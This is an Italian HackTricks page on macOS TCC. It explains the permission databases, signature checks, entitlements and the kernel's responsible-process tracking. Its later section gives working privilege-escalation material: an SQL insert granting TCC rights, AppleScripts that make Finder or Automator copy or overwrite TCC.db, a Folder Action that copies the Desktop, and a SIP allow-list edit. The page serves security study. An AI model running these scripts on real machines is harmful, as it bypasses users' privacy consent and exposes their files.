# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Informazioni di base**

**TCC (Transparency, Consent, and Control)** è un protocollo di sicurezza incentrato sulla regolamentazione dei permessi delle applicazioni. Il suo ruolo principale è proteggere funzionalità sensibili come **servizi di localizzazione, contatti, foto, microfono, fotocamera, accessibilità e accesso completo al disco**. Richiedendo il consenso esplicito dell'utente prima di concedere all'app l'accesso a questi elementi, TCC migliora la privacy e il controllo dell'utente sui propri dati.

Gli utenti entrano in contatto con TCC quando le applicazioni richiedono l'accesso a funzionalità protette. Questo avviene tramite un prompt che consente agli utenti di **approvare o negare l'accesso**. Inoltre, TCC supporta azioni dirette dell'utente, come **trascinare e rilasciare file in un'applicazione**, per concedere l'accesso a file specifici, assicurando che le applicazioni possano accedere solo a ciò che è stato esplicitamente autorizzato.

![Un esempio di prompt TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** è gestito dal **demone** situato in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` e configurato in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando il mach service `com.apple.tccd.system`).

È in esecuzione un **tccd in modalità utente** per ogni utente con sessione attiva, definito in `/System/Library/LaunchAgents/com.apple.tccd.plist`, che registra i mach services `com.apple.tccd` e `com.apple.usernotifications.delegate.com.apple.tccd`.

Qui è possibile vedere tccd in esecuzione come system e come user:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions are **ereditate** dall'applicazione **parent** e le **permissions** sono **tracciate** in base al **Bundle ID** e al **Developer ID**.

### Database TCC

Le autorizzazioni e i dinieghi vengono quindi memorizzati in alcuni database TCC:

- Il database a livello di sistema in **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Questo database è **protetto da SIP**, quindi solo un SIP bypass può scriverci.
- Il database TCC dell'utente **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** per le preferenze specifiche dell'utente.
- Questo database è protetto, quindi solo i processi con privilegi TCC elevati, come Full Disk Access, possono scriverci (ma non è protetto da SIP).

> [!WARNING]
> I database precedenti sono anche **protetti da TCC per l'accesso in lettura**. Pertanto, **non potrai leggere** il normale database TCC dell'utente a meno che l'accesso non provenga da un processo con privilegi TCC.
>
> Tuttavia, ricorda che un processo con questi privilegi elevati (come **FDA** o **`kTCCServiceEndpointSecurityClient`**) sarà in grado di scrivere nel database TCC dell'utente

- Esiste un **terzo** database TCC in **`/var/db/locationd/clients.plist`** che indica i client autorizzati ad **accedere ai servizi di localizzazione**.
- Il file protetto da SIP **`/Users/carlospolop/Downloads/REG.db`** (anch'esso protetto da TCC per l'accesso in lettura) contiene la **posizione** di tutti i **database TCC validi**.
- Il file protetto da SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (anch'esso protetto da TCC per l'accesso in lettura) contiene ulteriori autorizzazioni TCC concesse.
- Il file protetto da SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (ma leggibile da chiunque) è una allow list delle applicazioni che richiedono un'eccezione TCC.

> [!TIP]
> Il database TCC in **iOS** si trova in **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> La **UI del notification center** può apportare **modifiche al database TCC di sistema**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Tuttavia, gli utenti possono **eliminare o interrogare le regole** con l'utility da riga di comando **`tccutil`**.

#### Interrogare i database

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Controllando entrambi i database puoi verificare quali permessi un'app ha consentito, ha negato o non possiede (in tal caso li richiederà).

- Il **`service`** è la rappresentazione stringa del **permesso** TCC
- Il **`client`** è il **bundle ID** o il **percorso del binario** con i permessi
- Il **`client_type`** indica se si tratta di un Bundle Identifier(0) o di un percorso assoluto(1)

<details>

<summary>Come eseguire se si tratta di un percorso assoluto</summary>

Esegui semplicemente **`launctl load you_bin.plist`**, con un plist come:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** può avere diversi valori: denied(0), unknown(1), allowed(2) o limited(3).
- **`auth_reason`** può assumere i seguenti valori: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Il campo **csreq** indica come verificare il binary da eseguire e concedergli i permessi TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Per ulteriori informazioni sugli **altri campi** della tabella [**consulta questo post del blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Puoi anche controllare le **autorizzazioni già concesse** alle app in `Preferenze di Sistema --> Sicurezza e Privacy --> Privacy --> File e cartelle`.

> [!TIP]
> Gli utenti _possono_ **eliminare o interrogare le regole** utilizzando **`tccutil`** .

#### Reimpostare le autorizzazioni TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Controlli della firma TCC

Il **database** TCC memorizza il **Bundle ID** dell'applicazione, ma **memorizza** anche **informazioni** sulla **firma** per **assicurarsi** che l'App che richiede di utilizzare l'autorizzazione sia quella corretta.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Pertanto, altre applicazioni che usano lo stesso nome e bundle ID non potranno accedere alle autorizzazioni concesse ad altre app.

### Entitlements & TCC Permissions

Le app **non devono solo** **richiedere** e aver **ottenuto l'accesso** ad alcune risorse, ma devono anche **avere gli entitlements pertinenti**.\
Ad esempio, **Telegram** ha l'entitlement `com.apple.security.device.camera` per richiedere **l'accesso alla fotocamera**. Un'**app** che **non dispone** di questo **entitlement non potrà** accedere alla fotocamera (e all'utente non verrà nemmeno chiesto di concedere le autorizzazioni).

Si noti che gli entitlements sono file plist e fanno parte della code sig, sottoposti inoltre a hashing nella code sig tramite slot speciali, e possono essere interrogati nel kernel dal codice del kernel oppure dal codice user model usando `csops(#169)` o `csops_audittoken(#170)`.

Tuttavia, per **accedere** a **determinate cartelle dell'utente**, come `~/Desktop`, `~/Downloads` e `~/Documents`, le app **non devono** avere **entitlements** specifici. Il sistema gestirà l'accesso in modo trasparente e **chiederà conferma all'utente** quando necessario.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Le app di Apple **non genereranno prompt**. Contengono **diritti pre-concessi** nel loro elenco di **entitlements**, il che significa che **non genereranno mai un popup** e **non compariranno in nessuno dei database TCC.** Ad esempio:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Questo impedirà a Calendar di chiedere all'utente l'accesso a reminders, calendar e address book.

> [!TIP]
> Oltre ad alcune documentazioni ufficiali sugli entitlements, è anche possibile trovare **informazioni interessanti non ufficiali sugli entitlements in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Alcune autorizzazioni TCC sono: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Non esiste un elenco pubblico che le definisca tutte, ma puoi consultare questo [**elenco di quelle conosciute**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Percorsi sensibili non protetti

- $HOME (stesso)
- $HOME/.ssh, $HOME/.aws, ecc.
- /tmp

### Intento dell'utente / com.apple.macl

Come menzionato in precedenza, è possibile **concedere a un'App l'accesso a un file trascinandolo\&rilasciandolo su di essa**. Questo accesso non verrà specificato in alcun database TCC, ma come **attributo** **esteso del file**. Questo attributo **memorizzerà l'UUID** dell'app autorizzata:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> È curioso che l'attributo **`com.apple.macl`** sia gestito dal **Sandbox**, non da tccd.
>
> Nota inoltre che, se sposti su un altro computer un file che consente l'accesso all'UUID di un'app sul tuo computer, poiché la stessa app avrà UID diversi, il file non concederà l'accesso a quell'app.

L'attributo esteso `com.apple.macl` **non può essere cancellato** come gli altri attributi estesi perché è **protetto da SIP**. Tuttavia, come [**spiegato in questo post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), è possibile disabilitarlo **creando un archivio zip** del file, **eliminandolo** e **decomprimendo l'archivio**.<sup>[[3]](#references)</sup>






## Meccanismo del processo responsabile di XNU

In macOS/iOS, il meccanismo del **processo responsabile** è una funzionalità di sicurezza critica utilizzata dal framework **TCC (Transparency, Consent, and Control)** e da altri sistemi di sicurezza per monitorare quale processo sia in ultima analisi responsabile di un'azione, anche attraverso catene di processi figli.

Quando TCC verifica le autorizzazioni (ad esempio, fotocamera, microfono, posizione), non controlla sempre il processo immediato che effettua la richiesta. Controlla invece il **processo responsabile**, in genere l'applicazione GUI che ha avviato l'azione, anche se la richiesta effettiva proviene da un processo helper o da un daemon.

<details>
<summary>Come viene impostato il processo responsabile</summary>

### Campi della struttura del processo

Ogni processo in XNU mantiene due identificatori UUID fondamentali:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: l'UUID del processo stesso (dal comando di caricamento `LC_UUID` del suo binario Mach-O)
- **`p_responsible_pid`**: il PID del processo responsabile
- **`p_responsible_uuid`**: l'UUID del processo responsabile (rimane anche dopo l'uscita del processo)

### Come viene impostato il processo responsabile

1. **Durante la creazione del processo (Fork)**

Quando viene creato un nuovo processo tramite `fork()` o `posix_spawn()`, il processo responsabile viene ereditato dal processo padre (la syscall `exec()` riutilizza la struttura `proc` esistente, quindi questo passaggio non viene ripetuto lì):

**Posizione**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Punti chiave:**
- I processi figli **ereditano** il `p_responsible_pid` del processo padre
- Questo crea una **catena di responsabilità** attraverso la gerarchia dei processi
- Il processo responsabile punta tipicamente all'applicazione GUI originale

2. **La funzione principale: `proc_set_responsible_pid()`**

**Posizione**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Cosa fa questa funzione:**
1. **Imposta il PID responsabile** nel processo target
2. **Cerca il processo responsabile** usando `proc_find()` (incrementa il reference count)
3. **Copia l'UUID** dal campo `p_uuid` del processo responsabile al campo `p_responsible_uuid` del processo target
4. **Rilascia il riferimento** con `proc_rele()` (decrementa il reference count)

3. **Perché memorizzare sia il PID sia l'UUID?**

L'approccio con doppia memorizzazione risolve un problema critico:

| Campo | Scopo | Problema | Soluzione |
|-------|---------|---------|----------|
| `p_responsible_pid` | Ricerca rapida del processo corrente | Il PID può essere riutilizzato dopo la terminazione del processo | Utilizzato per la ricerca del processo attivo |
| `p_responsible_uuid` | Identificazione persistente | Sopravvive alla terminazione del processo | Utilizzato per i controlli di sicurezza e l'auditing |

**Il problema**: se il processo responsabile termina prima del processo figlio, il PID potrebbe essere riciclato e assegnato a un processo completamente diverso.

**La soluzione**: l'UUID è immutabile e identifica in modo univoco il binario specifico che era responsabile, anche dopo la sua terminazione.

### Flusso di creazione del processo
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### Origine dell'UUID: comando di caricamento LC_UUID

L'UUID memorizzato in `p_uuid` proviene dal comando di caricamento `LC_UUID` dell'eseguibile **Mach-O**:

1. **Momento della compilazione**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Tempo di esecuzione**

**Posizione**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Memorizzato nella struttura del processo**

**Location**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Percorso**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Inserimento in TCC

Se a un certo punto riesci a ottenere l'accesso in scrittura a un database TCC, puoi usare qualcosa di simile al seguente per aggiungere una voce (rimuovi i commenti):

<details>

<summary>Esempio di inserimento in TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Se sei riuscito a entrare in un'app con alcuni permessi TCC, consulta la pagina seguente con i TCC payload per abusarne:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Scopri di più sugli Apple Events in:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Il nome TCC del permesso Automation è: **`kTCCServiceAppleEvents`**\
Questo specifico permesso TCC indica anche **l'applicazione che può essere gestita** all'interno del database TCC (quindi i permessi non consentono di gestire semplicemente tutto).

**Finder** è un'applicazione che **ha sempre FDA** (anche se non appare nell'interfaccia utente); quindi, se disponi di privilegi **Automation** su di essa, puoi abusare dei suoi privilegi per **farle eseguire alcune azioni**.\
In questo caso, la tua app avrebbe bisogno del permesso **`kTCCServiceAppleEvents`** su **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Potresti sfruttare questa possibilità per **scrivere il tuo database TCC utente**.

> [!WARNING]
> Con questo permesso potrai **chiedere a Finder di accedere alle cartelle con restrizioni TCC** e di fornirti i file, ma afaik **non potrai fare in modo che Finder esegua codice arbitrario** per sfruttare completamente il suo accesso FDA.
>
> Pertanto, non potrai sfruttare tutte le funzionalità di FDA.

Questo è il prompt TCC per ottenere i privilegi di Automation su Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Nota che, poiché l'app **Automator** dispone del permesso TCC **`kTCCServiceAppleEvents`**, può **controllare qualsiasi app**, come Finder. Pertanto, disponendo del permesso per controllare Automator, potresti anche controllare **Finder** con un codice come quello riportato di seguito:

<details>

<summary>Ottieni una shell dentro Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Lo stesso accade con l'app **Script Editor,** che può controllare Finder, ma utilizzando un AppleScript non è possibile forzarla a eseguire uno script.

### Automation (SE) verso alcuni TCC

**System Events può creare Folder Actions e le Folder Actions possono accedere ad alcune cartelle TCC** (Desktop, Documents e Downloads), quindi uno script come quello seguente può essere utilizzato per sfruttare questo comportamento:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automazione (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) per FDA\*

L'Automazione su **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) consente di inviare **keystrokes ai processi**. In questo modo potresti abusare di Finder per modificare il TCC.db dell'utente o concedere FDA a un'app arbitraria (anche se potrebbe essere richiesta la password per farlo).

Esempio di Finder che sovrascrive il TCC.db dell'utente:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` a FDA\*

Controlla questa pagina per alcuni [**payload per abusare dei permessi di Accessibility**](macos-tcc-payloads.md#accessibility) ed effettuare il privesc a FDA\* o eseguire, ad esempio, un keylogger.

### **Endpoint Security Client a FDA**

Se disponi di **`kTCCServiceEndpointSecurityClient`**, hai FDA. Fine.

### System Policy SysAdmin File a FDA

**`kTCCServiceSystemPolicySysAdminFiles`** consente di **modificare** l'attributo **`NFSHomeDirectory`** di un utente, modificando la sua home folder e permettendo quindi di **bypassare TCC**.<sup>[[5]](#references)</sup>

### User TCC DB a FDA

Ottenendo **permessi di scrittura** sul database **TCC dell'utente** non puoi concederti permessi **`FDA`**, poiché solo quello presente nel database di sistema può concederli.

Tuttavia, puoi concederti **diritti di Automation su Finder** e sfruttare la tecnica precedente per effettuare il privesc a FDA\*.

### **FDA ai permessi TCC**

Il nome TCC di **Full Disk Access** è **`kTCCServiceSystemPolicyAllFiles`**

Non credo che questo sia un vero privesc, ma nel caso possa esserti utile: se controlli un programma con FDA puoi **modificare il database TCC dell'utente e concederti qualsiasi accesso**. Questo può essere utile come tecnica di persistenza nel caso in cui tu possa perdere i permessi FDA.

### **SIP Bypass a TCC Bypass**

Il **database TCC** di sistema è protetto da **SIP**, motivo per cui solo i processi con gli **entitlement indicati potranno modificarlo**. Pertanto, se un attaccante trova un **SIP bypass** su un **file** (riuscendo a modificare un file soggetto alle restrizioni di SIP), potrà:

- **Rimuovere la protezione** di un database TCC e concedersi tutti i permessi TCC. Ad esempio, potrebbe abusare di uno qualsiasi di questi file:
- Il database TCC di sistema
- REG.db
- MDMOverrides.plist

Tuttavia, esiste un'altra possibilità per sfruttare questo **SIP bypass per bypassare TCC**: il file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` è una allow list delle applicazioni che richiedono un'eccezione TCC. Pertanto, se un attaccante può **rimuovere la protezione SIP** da questo file e aggiungere la propria **applicazione**, l'applicazione potrà bypassare TCC.\
Ad esempio, per aggiungere terminale:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypasses


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Riferimenti

- [1] [Analisi approfondita di macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script per monitorare com.apple.macl (Gist di brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Monitorare e gestire com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Bypass delle protezioni della privacy utente di macOS TCC per caso e intenzionalmente](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Cambiare la home directory ed eseguire il bypass di TCC, ovvero CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)

{{#include ../../../../banners/hacktricks-training.md}}
